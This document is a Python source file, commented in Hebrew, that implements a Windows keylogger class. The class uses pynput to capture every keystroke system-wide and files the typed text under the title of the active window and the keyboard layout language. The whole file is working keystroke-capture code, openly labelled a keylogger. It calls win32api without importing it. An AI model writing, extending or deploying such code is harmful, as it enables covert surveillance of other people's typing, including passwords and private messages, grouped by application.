from abc import ABC, abstractmethod
from typing import List, Dict, Any
import win32gui
from pynput.keyboard import Listener, Key


class IKeyLogger(ABC):
    """
    ממשק מופשט עבור לוגר מקלדת.
    מגדיר את הפעולות הנדרשות לכל יישום של לוגר מקלדת.
    """

    @abstractmethod
    def start_logging(self) -> None:
        """מתחיל את תהליך הרישום של לחיצות מקלדת."""
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        """מפסיק את תהליך הרישום של לחיצות מקלדת."""
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[Dict[str, Dict[str, str]]]:
        """
        מחזיר את רשימת הלחיצות שנרשמו.

        Returns:
            List[Dict[str, Dict[str, str]]]: רשימה של מילונים, כאשר כל מילון מייצג רישום
                                             עבור חלון פעיל, הכולל את הטקסט שנרשם ואת שפת המקלדת.
        """
        pass


class MeinKeylogger(IKeyLogger):
    """
    יישום של לוגר מקלדת הרושם לחיצות מקלדת ומאחסן אותן
    ביחס לחלון הפעיל ולשפת המקלדת בעת הלחיצה.
    """

    def __init__(self):
        """
        אתחול אובייקט MeinKeylogger.
        מגדיר את המאזין (listener) ל-None ואת רשימת הלחיצות (logged_keys) כרשימה ריקה.
        """
        self.listener = None
        self.logged_keys: List[Dict[str, Dict[str, str]]] = []
        self.keys_dict = {  # העברתי את keys_dict לתוך __init__ לשיפור קריאות וארגון
            "Key.alt": "(*alt*)",
            "Key.alt_l": "(*alt_l*)",
            "Key.alt_r": "(*alt_r*)",
            "Key.alt_gr": "(*alt_gr*)",
            "Key.backspace": "\b",
            "Key.caps_lock": "(*caps_lock*)",
            "Key.cmd": "(*cmd*)",
            "Key.cmd_l": "(*cmd_l*)",
            "Key.cmd_r": "(*cmd_r*)",
            "Key.ctrl": "(*ctrl*)",
            "Key.ctrl_l": "(*ctrl_l*)",
            "Key.ctrl_r": "(*ctrl_r*)",
            "Key.delete": "(*delete*)",
            "Key.down": "(*down*)",
            "Key.end": "(*end*)",
            "Key.enter": "\n",
            "Key.esc": "(*esc*)",
            "Key.f1": "(*f1*)",
            "Key.f2": "(*f2*)",
            "Key.f3": "(*f3*)",
            "Key.f4": "(*f4*)",
            "Key.f5": "(*f5*)",
            "Key.f6": "(*f6*)",
            "Key.f7": "(*f7*)",
            "Key.f8": "(*f8*)",
            "Key.f9": "(*f9*)",
            "Key.f10": "(*f10*)",
            "Key.f11": "(*f11*)",
            "Key.f12": "(*f12*)",
            "Key.f13": "(*f13*)",
            "Key.f14": "(*f14*)",
            "Key.f15": "(*f15*)",
            "Key.f16": "(*f16*)",
            "Key.f17": "(*f17*)",
            "Key.f18": "(*f18*)",
            "Key.f19": "(*f19*)",
            "Key.f20": "(*f20*)",
            "Key.home": "(*home*)",
            "Key.left": "(*left*)",
            "Key.page_down": "(*page_down*)",
            "Key.page_up": "(*page_up*)",
            "Key.right": "(*right*)",
            "Key.shift": "(*shift*)",
            "Key.shift_l": "(*shift_l*)",
            "Key.shift_r": "(*shift_r*)",
            "Key.space": " ",
            "Key.tab": "\t",
            "Key.up": "(*up*)",
            "Key.media_play_pause": "(*media_play_pause*)",
            "Key.media_volume_mute": "(*media_volume_mute*)",
            "Key.media_volume_down": "(*media_volume_down*)",
            "Key.media_volume_up": "(*media_volume_up*)",
            "Key.media_previous": "(*media_previous*)",
            "Key.media_next": "(*media_next*)",
            "Key.insert": "(*insert*)",
            "Key.menu": "(*menu*)",
            "Key.num_lock": "(*num_lock*)",
            "Key.pause": "(*pause*)",
            "Key.print_screen": "(*print_screen*)",
            "Key.scroll_lock": "(*scroll_lock*)"
        }
        # מילון שפה מצומצם - רק שפות מרכזיות: עברית, ערבית, אנגלית ורוסית
        self.language_dict = {
            "00000409": "English",  # English (United States) - נפוץ כברירת מחדל
            "00010409": "English",  # English (Canada)
            "00020409": "English",  # English (UK)
            "00040409": "English",  # English (Australia)
            "00080409": "English",  # English (New Zealand)
            "0000040d": "Hebrew",
            "0001040d": "Hebrew",  # Hebrew (Israel) - ספציפי יותר
            "0x40d": "Hebrew",  # ייצוג נוסף לעברית
            "he": "Hebrew",  # ייצוג נוסף לעברית
            "00000401": "Arabic",  # ערבית - כללי
            "00010401": "Arabic",  # ערבית - סעודיה
            "00020401": "Arabic",  # ערבית - עיראק
            "00030401": "Arabic",  # ערבית - מצרים
            "00040401": "Arabic",  # ערבית - לוב
            "00050401": "Arabic",  # ערבית - אלג'יר
            "00060401": "Arabic",  # ערבית - מרוקו
            "00070401": "Arabic",  # ערבית - תוניסיה
            "00080401": "Arabic",  # ערבית - עומאן
            "00090401": "Arabic",  # ערבית - תימן
            "000a0401": "Arabic",  # ערבית - סוריה
            "000b0401": "Arabic",  # ערבית - ירדן
            "000c0401": "Arabic",  # ערבית - לבנון
            "000d0401": "Arabic",  # ערבית - כווית
            "000e0401": "Arabic",  # ערבית - איחוד האמירויות
            "000f0401": "Arabic",  # ערבית - בחריין
            "00100401": "Arabic",  # ערבית - קטר
            "00110401": "Arabic",  # ערבית - מזרח תיכון
            "00120401": "Arabic",  # ערבית - צפון אפריקה
            "ar": "Arabic",  # ייצוג נוסף לערבית
            "00000419": "Russian",
            "ru": "Russian"  # ייצוג נוסף לרוסית
            # ניתן להוסיף עוד וריאציות של מזהי שפה אם יש צורך
        }

    def _get_active_window_title(self) -> str:
        """
        מקבל את הכותרת של החלון הפעיל כרגע.

        Returns:
            str: כותרת החלון הפעיל, או None אם לא ניתן לקבל את הכותרת.
        """
        window = win32gui.GetForegroundWindow()
        if window:
            return win32gui.GetWindowText(window)
        return "No Active Window"  # טיפול במקרה שאין חלון פעיל

    def _add_key_and_window(self, event: str) -> None:
        """
        מוסיף את האירוע (לחיצת מקש) לרשימת הלחיצות, משויך לכותרת החלון הפעיל ולשפה.

        Args:
            event (str): האירוע (מקש או תו) שנרשם.
        """
        window_title = self._get_active_window_title()
        language_id = win32api.GetKeyboardLayoutName()
        language_name = self.language_dict.get(language_id, "Unknown Language")  # תרגום מזהה שפה לשם שפה

        if not self.logged_keys or window_title not in self.logged_keys[-1]:
            # אם רשימת הלוגים ריקה או אם החלון השתנה, מתחילים רישום חדש לחלון
            self.logged_keys.append({window_title: {'text': event, 'language': language_name}})  # שומרים שם שפה
        else:
            # אם החלון לא השתנה, מוסיפים את הטקסט לרישום הקיים של החלון
            self.logged_keys[-1][window_title]['text'] += event

        print(type(event))  # השארתי את ה print לבקשתך
        print(self.logged_keys)  # השארתי את ה print לבקשתך

    def _on_key_press(self, key: Key) -> None:
        """
        פונקציה זו מופעלת בכל פעם שלוחצים על מקש.
        היא ממירה את המקש לתו או לייצוג מיוחד, ומוסיפה אותו ללוג.

        Args:
            key (Key): אובייקט המקש שנלחץ.
        """
        try:
            key_char = key.char  # מנסה לקבל תו רגיל
        except AttributeError:
            key_char = str(key)  # אם זה מקש מיוחד, ממיר למחרוזת
        key_to_log = self.keys_dict.get(key_char, key_char)  # משתמש במילון להחלפה לייצוג מיוחד
        self._add_key_and_window(key_to_log)

    def start_logging(self) -> None:
        """
        מתחיל את תהליך הרישום על ידי הפעלת מאזין ללחיצות מקלדת בחוט נפרד.
        """
        if self.listener is None or not self.listener.is_alive():  # מונע הפעלה של מאזין כפול
            self.logged_keys = []  # איפוס הלוגים בהתחלה חדשה
            self.listener = Listener(on_press=self._on_key_press)
            self.listener.start()
            print("Keylogger started")  # אינדיקציה שהלוגר התחיל

    def stop_logging(self) -> None:
        """
        מפסיק את תהליך הרישום על ידי עצירת המאזין.
        """
        if self.listener and self.listener.is_alive():  # בודק שהמאזין פעיל לפני עצירה
            self.listener.stop()
            self.listener.join()  # מחכה לסיום החוט כדי למנוע בעיות סגירה
            self.listener = None  # מאפס את המאזין
            print("Keylogger stopped")  # אינדיקציה שהלוגר נעצר
        else:
            print("Keylogger is not running")  # הודעה אם מנסים לעצור לוגר שלא פועל

    def get_logged_keys(self) -> List[Dict[str, Dict[str, str]]]:
        """
        מחזיר את הלחיצות שנרשמו עד כה.

        Returns:
            List[Dict[str, Dict[str, str]]]: רשימת הלחיצות מקלדת שנרשמו, מאורגנות לפי חלון ושפה.
        """
        return self.logged_keys
